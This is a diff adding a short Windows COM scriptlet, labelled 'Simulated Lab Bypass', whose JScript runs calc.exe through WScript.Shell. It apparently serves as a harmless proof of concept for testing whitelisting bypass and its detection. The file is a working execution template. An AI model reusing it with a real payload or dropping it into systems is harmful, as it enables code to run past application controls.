@@ -1,0 +1,16 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="Simulated Lab Bypass"
+    progid="SimulatedBypass"
+    version="1.00"
+    classid="{10000000-0000-0000-0000-000000000001}"
+>
+<script language="JScript">
+<![CDATA[
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("calc.exe");
+]]>
+</script>
+</registration>
+</scriptlet>
